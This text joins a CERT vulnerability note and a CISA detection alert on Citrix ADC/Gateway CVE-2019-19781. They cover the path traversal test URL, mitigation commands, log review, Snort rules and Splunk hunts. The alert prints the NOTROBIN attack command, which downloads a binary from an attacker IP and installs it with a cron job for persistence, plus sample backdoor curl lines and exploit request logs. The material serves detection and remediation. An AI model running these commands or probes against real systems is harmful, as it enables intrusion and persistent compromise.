## Citrix Application Delivery Controller, Citrix Gateway, and Citrix SD-WAN WANOP web server vulnerability

#### Vulnerability Note VU#619785

Original Release Date: 2020-01-08 | Last Revised: 2020-02-03

---

### Overview

A vulnerability been [identified](https://support.citrix.com/article/CTX267027) in Citrix Application Delivery Controller (ADC) formerly known as NetScaler ADC, Citrix Gateway formerly known as NetScaler Gateway, and Citrix SDWAN WANOP that could allow an unauthenticated remote attacker to execute arbitrary code on a vulnerable system.

### Description

| Citrix has published a [security bulletin](https://support.citrix.com/article/CTX267027) that mentions a vulnerability that can be exploited to achieve arbitrary code execution by a remote, unauthenticated attacker. Although the bulletin does not describe details about the vulnerability, the [mitigation steps](https://support.citrix.com/article/CTX267679) describe techniques to block the handling of requests that contain a directory traversal attempt (/../) and also requests that attempt to access the /vpns/ directory.  Limited testing has shown that the affected Citrix software fails to restrict access to perl scripts that are available via the /vpns/ path. An unauthenticated remote attacker may be able to provide crafted content to these scripts that result in arbitrary code execution. One technique that has been [outlined](https://www.tripwire.com/state-of-security/vert/citrix-netscaler-cve-2019-19781-what-you-need-to-know/) involves the writing of an XML file using a directory traversal and the subsequent command execution by way of the [Perl Template Toolkit](http://www.template-toolkit.org/). Other exploitation techniques may be possible.A link of the following form can be used to determine if a system is affected:https:// CITRIXGATEWAY /vpn/../vpns/cfg/smb.confFor example, the following curl command can be used:curl https:// CITRIXGATEWAY /vpn/../vpns/cfg/smb.conf --path-as-is -k -fThe " CITRIXGATEWAY " string should be replaced with the name or IP of the system you wish to test. If retrieving the link results in a 403 Forbidden error, then the mitigations outlined below have likely been applied. However, if retrieving the link results in the contents of a smb.conf file, then the system is vulnerable. |
| --- |

### Impact

| By exploiting this vulnerability, a remote, unauthenticated attacker may be able to execute arbitrary code on a vulnerable system. |
| --- |

### Solution

| **Apply an update**Citrix has released updates in [Security Bulletin CTX267027](https://support.citrix.com/article/CTX267027). The updated software is designed to prevent unauthenticated attackers from accessing certain web server features. If updates are unavailable for your platform, or if you are otherwise unable to apply updates, please consider the following workarounds: |
| --- |

| **Block the handling of specially-crafted requests**Citrix article [CTX267679](https://support.citrix.com/article/CTX267679) contains several mitigation options for this vulnerability, depending on what type of product installation is used. For example, on a stand-alone system, the following commands are reported to mitigate this vulnerability:   nable ns feature responderadd responder action respondwith403 respondwith "\"HTTP/1.1 403 Forbidden\r\\r\add responder policy ctx267027 "HTTP.REQ.URL.DECODE\_USING\_TEXT\_MODE.CONTAINS(\"/vpns/\") && (!CLIENT.SSLVPN.IS\_SSLVPN || HTTP.REQ.URL.DECODE\_USING\_TEXT\_MODE.CONTAINS(\"/../\"))" respondwith403bind responder global ctx267027 1 END -type REQ\_OVERRIDEsave config shell nsapimgr\_wr.sh -ys skip\_systemaccess\_policyeval=0shell "echo 'nsapimgr\_wr.sh -ys skip\_systemaccess\_policyeval=0' >> /nsconfig/rc.netscaler"reboot Note that other configurations, such as CLIP, and HA, the steps to mitigate this vulnerability may be different.

Cybersecurity Advisory
# Detecting Citrix CVE-2019-19781

Last RevisedMay 21, 2020
Alert CodeAA20-031A

### Summary

Unknown cyber network exploitation (CNE) actors have successfully compromised numerous organizations that employed vulnerable Citrix devices through a critical vulnerability known as CVE-2019-19781.[[1]](https://www.citrix.com/blogs/2020/01/24/citrix-releases-final-fixes-for-cve-2019-19781/)

Though mitigations were released on the same day Citrix announced CVE-2019-19781, organizations that did not appropriately apply the mitigations were likely to be targeted once exploit code began circulating on the internet a few weeks later.

Compromised systems cannot be remediated by applying software patches that were released to fix the vulnerability. Once CNE actors establish a foothold on an affected device, their presence remains even though the original attack vector has been closed.

The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Alert to provide tools and technologies to assist with detecting the presence of these CNE actors. Unpatched systems and systems compromised before the updates were applied remain susceptible to exploitation.

Contact [CISA](https://www.us-cert.gov/report), or the [FBI](https://www.fbi.gov/contact-us/field-offices/field-offices) to report an intrusion or to request assistance.

### Technical Details

## Detection

CISA has developed the following procedures for detecting a CVE-2019-19781 compromise.

#### HTTP Access and Error Log Review

**Context:** Host Hunt

**Type:** Methodology

The impacted Citrix products utilize Apache for web server software, and as a result, HTTP access and error logs should be available on the system for review in `/var/log`. Log files `httpaccess.log` and `httperror.log` should both be reviewed for the following Uniform Resource Identifiers (URIs), found in the proof of concept exploit that was released.

* `'*/../vpns/*'`
* `'*/vpns/cfg/smb.conf'`
* `'*/vpns/portal/scripts/newbm.pl*'`
* `'*/vpns/portal/scripts/rmbm.pl*'`
* `'*/vpns/portal/scripts/picktheme.pl*'`

Note: These URIs were observed in Security Information and Event Management detection content provided by <https://github.com/Neo23x0/sigma/blob/master/rules/web/web_citrix_cve_2019_19781_exploit.yml>.[[2]](https://github.com/Neo23x0/sigma/blob/master/rules/web/web_citrix_cve_2019_19781_exploit.yml)

Per TrustedSec, a sign of successful exploitation would be a `POST` request to a URI containing `/../` or `/vpn`, followed by a GET request to an XML file. If any exploitation activity exists—attempted or successful—analysts should be able to identify the attacking Internet Protocol address(es). Tyler Hudak’s blog provided sample logs indicating what a successful attack would look like.[[3]](https://www.trustedsec.com/blog/netscaler-remote-code-execution-forensics/)

`10.1.1.1 - - [10/Jan/2020:13:23:51 +0000] "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1" 200 143 "https://10.1.1.2/" "USERAGENT "`
`10.1.1.1 - - [10/Jan/2020:13:23:53 +0000] "GET /vpn/../vpns/portal/backdoor.xml HTTP/1.1" 200 941 "-" "USERAGENT"`

Additionally, FireEye provided the following `grep` commands to assist with log review and help to identify suspicious activity.[[4]](https://www.fireeye.com/blog/products-and-services/2020/01/rough-patch-promise-it-will-be-200-ok.html)

`grep -iE 'POST.*\.pl HTTP/1\.1\" 200 ' /var/log/httpaccess.log -A 1`
`grep -iE 'GET.*\.xml HTTP/1\.1\" 200' /var/log/httpaccess.log -B 1`
#### Running Processes Review

**Context:** Host Hunt

**Type:** Methodology

Reviewing the running processes on a system suspected of compromise for processes running under the `nobody` user can identify potential backdoors.

`ps auxd | grep nobody`

Analysts should review the `ps` output for suspicious entries such as this:

`nobody    63390  0.0  0.0  8320    16  ??  I     1:35PM   0:00.00 | | `– sh -c uname &amp; curl -o – http://10.1.1.2/backdoor`

Further pivoting can be completed using the Process ID from the PS output:

`lsof -p <pid>`

Due to the nature of this exploit, it is likely that any processes related to a backdoor would be running under the `httpd` process.

### Checking for NOTROBIN Presence

**Context:** Host Hunt

**Type:** Methodology

`pkill -9 netscalerd; rm /var/tmp/netscalerd; mkdir /tmp/.init; curl -k`

`hxxps://95.179.163[.]186/wp-content/uploads/2018/09/64d4c2d3ee56af4f4ca8171556d50faa -o`

`/tmp/.init/httpd; chmod 744 /tmp/.init/httpd; echo "* * * * *`

`/var/nstmp/.nscache/httpd" | crontab -; /tmp/.init/httpd &"`

The above is the NOTROBIN Bash exploit code. To check for NOTROBIN Presence, analysts should look for the staging directory at `/tmp/.init` as well as `httpd` processes running as a cron job.

Running the command `find / -name ".init" 2> /tmp/error.log` should return the path to the created staging directory while taking all of the errors and creating a file located at `/tmp/error.log`.

### Additional /var/log Review

**Context:** Host Hunt

**Type:** Methodology

Analysts should focus on reviewing the following logs in `/var/log` on the Citrix device, if available. The underlying operating system is based on FreeBSD, and the logs are similar to what would be found on a Linux system. Analysts should focus on log entries related to the `nobody` user or `(null) on` and should try to identify any suspicious commands that may have been run, such as `whoami` or `curl`. Please keep in mind that logs are rotated and compressed, and additional activity may be found in the archives (.gz files) for each log.

**bash.log**

Sample Log Entry:

`Jan 10 13:35:47`

`<local7.notice> ns bash[63394]: nobody on /dev/pts/3`

`shell_command="hostname"`

Note: The bash log can provide the user (`nobody`), command (`hostname`), and process id (`63394`) related to the nefarious activity.

**sh.log**

**notice.log**

### Check Crontab for Persistence

**Context:** Host Hunt

**Type:** Methodology

As with running processes and log entries, any cron jobs created by the user `nobody` are a cause for concern and likely related to a persistence mechanism established by an attacker. Additionally, search for a `httpd` process within the crontab to determine if a system has been affected by NOTROBIN. Analysts can review entries on a live system using the following command:

`crontab -l -u nobody`
### Existence of Unusual Files

**Context:** Host Hunt

**Type:** Methodology

Open-source outlets have reported that during incident response activities, attackers exploiting this vulnerability have been placing malicious files in the following directories. Analysts should review file listings for these directories and determine if any suspicious files are present on the server.

* `/netscaler/portal/templates`
* `/var/tmp/netscaler/portal/templates`

### Snort Alerts

**Context:** Network Alert

**Type:** Signatures

Although most activity related to exploitation of the Citrix vulnerability would use SSL, FireEye noted that an HTTP scanner is available to check for the vulnerability. The following Snort rules were provided in FireEye’s blog post and would likely indicate a vulnerable Citrix server.[5] These rules should be tuned for the environment and restricted to the IP addresses of the Citrix server(s) to reduce potential false positives.

`alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Potential CVE-2019-19781 vulnerable .CONF response"; flow:established,to_client; content:"HTTP/1."; depth:7; content:"200 OK"; distance:1; content:"|0d0a|Server: Apache"; distance:0; content:"al]|0d0a|"; distance:0; content:"encrypt passwords"; distance:0; content:"name resolve order"; reference:cve,2019-19781; reference:url,https://www.fireeye.com/blog/products-and-services/2020/01/rough-patch-promise-it-will-be-200-ok.html; sid:201919781; rev:1;)`

### Suspicious Network Traffic

**Context:** Network Hunt

**Type:** Methodology

From a network perspective, this vulnerability will likely not be detectable, given that the traffic will likely be encrypted (SSL). Additionally, due to where they sit on networks, devices such as these are typically not covered in traditional network monitoring and ingress traffic to the device may not be part of a normal SPAN port configuration. In the event network monitoring is available and attackers are using HTTP versions of this exploit, CISA recommends looking for URIs containing `/../` or `/vpns/` to identify potentially malicious activity. It is also worth surveying the traffic for any requests to .xml files or perl (.pl) files as well, as this would not be consistent with normal Citrix web activity. As with the web logs, analysts would be looking for a successful `POST` request followed by a successful `GET` request with the aforementioned characteristics.

Given that a compromise occurred, activity to look for would be outbound traffic from the Citrix server, both to internal and external hosts. In theory, if an attacker placed a backdoor on the system, it should be connecting outbound to a command and control server. This traffic would most likely be anomalous (outbound TCP Port 80 or 443), given that one would only expect to see inbound TCP/443 traffic to the Citrix server as normal activity. If an attacker is leveraging a Citrix device as an entry point to an organization, anomalous internal traffic could potentially be visible in bro data such as scanning, file transfers, or lateral movement. An exception to internal traffic is that the Citrix ADC device is much more than just an SSL VPN device and is used for multiple types of load balancing. As a result, an ADC device may be communicating with internal systems legitimately (web servers, file servers, custom applications, etc.).

**Inbound Exploitation Activity (Suspicious URIs)**

`index=bro dest=<CITRIX_IP_ADDR> sourcetype=bro_http uri=*/../* OR uri=*/vpn* OR uri=*.pl OR uri=*.xml`

**Outbound Traffic Search (Backdoor C2)**

`index=bro sourcetype=bro_conn src=<CITRIX_IP_ADDR> dest!=<INTERNAL_NET>`

`| stats count by src dest dest_port`

`| sort -count`

The following resources provide additional detection measures.

* Citrix and FireEye Mandiant released an IOC scanning tool for CVE-2019-19781.[[6]](https://github.com/citrix/ioc-scanner-CVE-2019-19781/) The tool aids customers with detecting potential IOCs based on known attacks and exploits.
* The National Security Agency released a Cybersecurity Advisory on CVE-2019-19781 with additional detection measures.[[7]](https://media.defense.gov/2020/Jan/10/2002233132/-1/-1/0/CSA%20FOR%20CITRIXADCANDCITRIXGATEWAY_20200109.PDF)
* CISA released a utility that enables users and administrators to detect whether their Citrix ADC and Citrix Gateway firmware is susceptible to CVE-2019-19781.[[8]](https://github.com/cisagov/check-cve-2019-19781)
